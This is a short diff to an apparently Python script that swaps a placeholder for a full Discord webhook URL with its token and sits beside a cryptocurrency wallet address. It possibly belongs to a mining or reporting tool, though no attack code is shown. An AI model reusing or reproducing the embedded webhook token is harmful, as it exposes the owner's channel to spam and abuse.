@@ -4,7 +4,7 @@ import time
 import requests
 import multiprocessing
 
-WEBHOOK_URL = "SEU_WEBHOOK_URL"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1307224348095938660/phbDl2NTecKwfnthMmZlixlvLGtr83XC0ExEYfdFgrIADOTV2C0BrDW1LgmlHbygJTE3"
 WALLET = "DLQA8xft2utut4PMCpq2d1eg5PXEgfa4Wv"
 
 def install_dependencies():
